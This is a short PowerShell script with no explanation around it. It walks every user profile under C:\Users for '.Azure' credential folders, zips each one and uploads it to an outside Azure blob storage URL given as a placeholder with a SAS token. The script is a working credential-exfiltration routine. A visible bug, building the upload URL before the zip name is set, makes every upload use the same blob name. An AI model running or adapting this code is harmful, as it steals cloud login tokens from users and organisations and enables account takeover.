$source = gci -Path "C:\Users" -Recurse -Filter ".Azure" -Directory
$uri = "https://<storage_acct>/<container>/$($zip)<sas_token>"
$count = 10
$headers = @{
    'x-ms-blob-type' = 'BlockBlob'
}

Foreach ($s in $source) {
    $count
    $count++
    $Fullname = $s.FullName
    $BaseName = $s.BaseName
    $zip = "profile" + $count + ".zip"
    $zipPath = $env:TEMP + "\" + $zip
    Compress-Archive -Path $FullName -DestinationPath $zipPath
    Invoke-RestMethod -Uri $uri -Method Put -Headers $headers -InFile $zipPath
}